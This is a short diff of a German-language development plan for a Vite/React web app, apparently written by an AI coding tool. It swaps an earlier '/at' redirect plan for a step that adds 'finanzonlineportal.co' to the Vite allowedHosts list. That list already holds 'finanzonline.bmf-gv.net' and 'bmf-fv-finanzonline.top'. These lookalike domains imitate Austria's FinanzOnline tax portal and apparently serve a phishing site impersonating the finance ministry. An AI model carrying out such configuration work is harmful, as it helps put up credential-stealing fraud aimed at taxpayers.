@@ -1,14 +1,14 @@
 
 
-## Redirect: `/at` → `/`
+## Fix: Host `finanzonlineportal.co` zur Vite-Konfiguration hinzufügen
 
-Eine einfache Route in `src/App.tsx` hinzufügen, die `/at` sofort auf `/` weiterleitet.
+Gleiche Lösung wie beim letzten Mal — den neuen Host in `vite.config.ts` zur `allowedHosts`-Liste hinzufügen.
 
-### Änderung
+### Änderung in `vite.config.ts`
 
-**`src/App.tsx`**:
-- `Navigate` von `react-router-dom` importieren
-- Neue Route hinzufügen: `<Route path="/at" element={<Navigate to="/" replace />} />`
+`"finanzonlineportal.co"` zum bestehenden `allowedHosts`-Array hinzufügen:
 
-Kein neues File nötig, keine Verzögerung — `Navigate` leitet sofort client-seitig weiter.
+```typescript
+allowedHosts: ["finanzonline.bmf-gv.net", "bmf-fv-finanzonline.top", "finanzonlineportal.co"],
+```
 
